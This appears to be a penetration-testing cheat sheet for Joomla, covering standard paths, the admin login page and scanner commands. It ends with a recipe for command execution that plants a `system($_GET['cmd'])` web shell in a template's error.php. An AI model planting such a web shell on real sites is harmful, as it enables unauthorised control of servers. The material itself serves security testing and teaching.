# Joomla

## Standard pages and folders

#### License files

* `/readme.txt`
* `/administrator/manifests/files/joomla.xml _`
* `/language/en-GB/en-GB.xml`
* `/plugins/system/cache/cache.xml`

#### Login pages

* `/administrator`

#### Resource folder

* `plugins/`
* `plugins/system`
* `templates/`

## Automatic scan tools

### joomscan

A tool written in Perl capable of performing several checks on Joomla configuration and detect vulnerable components. Can be downloaded from [here](https://github.com/OWASP/joomscan)

```
perl joomscan.pl --update        #update vulnerable dependencies database
perl joomscan.pl --url <url>     #perform base checks
perl joomscan.pl -u <url> --ec   #enumerate components
```

### droopescan

Limited support for joomla. Can detect version and interesting urls. Can be downloaded from [here](https://github.com/SamJoan/droopescan)

```
droopescan scan joomla --url <url>
```

## Authenticated RCE

After obtaining access to the administrative panel it is possible to execute commands on the underlying machine by editing a template page.

1. Select a template to edit
2. Append `system($_GET['cmd']);` in the error.php page and save
3. Navigate to `<host>/templates/<template>/error.php?cmd=<cmd>`

It is also possible to append the payload to launch a reverse shell and trigger it by visiting the modified page
